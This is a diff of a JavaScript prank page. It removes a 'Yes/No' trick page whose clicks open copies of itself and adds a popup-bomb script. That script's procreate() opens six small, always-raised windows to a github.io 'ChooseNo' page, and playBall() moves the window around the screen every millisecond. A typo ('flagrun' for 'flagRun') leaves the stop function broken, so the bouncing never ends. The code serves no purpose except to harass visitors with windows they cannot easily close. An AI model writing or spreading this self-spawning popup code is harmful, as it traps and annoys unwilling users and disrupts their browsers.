@@ -1,35 +1,60 @@
 
-// Select necessary elements
-const yesBtn = document.querySelector(".yes-btn");
-const noBtn = document.querySelector(".no-btn");
-const question = document.querySelector(".question");
-const gif = document.querySelector(".gif");
 
-// Behavior for the 'Yes' button
-yesBtn.addEventListener("click", () => {
-    question.innerHTML = "Correct Choice!";
-    gif.src = "trumpGif.gif";
-    yesBtn.style.display = "none";
-    noBtn.style.display = "none";
-});
+		var xOff = 5;
+		var yOff = 5;
+		var xPos = 400;
+		var yPos = -100;
+		var flagRun = 1;
 
-// Prevent "No" button from being clicked
-noBtn.addEventListener("mouseover", () => {
-    const wrapper = document.querySelector(".wrapper");
-    const wrapperRect = wrapper.getBoundingClientRect();
-    const noBtnRect = noBtn.getBoundingClientRect();
+function openWindow(url){
+        aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
+}
 
-    const maxX = wrapperRect.width - noBtnRect.width;
-    const maxY = wrapperRect.height - noBtnRect.height;
+function procreate(){
+		openWindow('https://adafirdevs1.github.io/ChooseNo/');
+		openWindow('https://adafirdevs1.github.io/ChooseNo/');
+		openWindow('https://adafirdevs1.github.io/ChooseNo/');
+		openWindow('https://adafirdevs1.github.io/ChooseNo/');
+		openWindow('https://adafirdevs1.github.io/ChooseNo/');
+		openWindow('https://adafirdevs1.github.io/ChooseNo/');
+		}
 
-    const randomX = Math.floor(Math.random() * maxX);
-    const randomY = Math.floor(Math.random() * maxY);
+function newXlt(){
+        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
+        window.focus()}
 
-    noBtn.style.left = randomX + "px";
-    noBtn.style.top = randomY + "px";
-});
+function newXrt(){
+        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+        }
 
-// Add a click event listener to the document for cloning functionality
-document.addEventListener("click", () => {
-    window.open(window.location.href, '_blank');
-});
+function newYup(){
+        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
+        }
+
+function newYdn(){
+        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+        }
+function fOff(){
+        flagrun = 0;
+        }
+
+function playBall(){
+        xPos += xOff;
+        yPos += yOff;
+        if (xPos > screen.width-175){
+        newXlt();
+        }
+        if (xPos < 0){
+        newXrt();
+        }
+        if (yPos > screen.height-100){
+        newYup();
+        }
+        if (yPos < 0){
+        newYdn();
+        }
+        if (flagRun == 1){
+        window.moveTo(xPos,yPos);
+        setTimeout('playBall()',1);
+        }
+        }
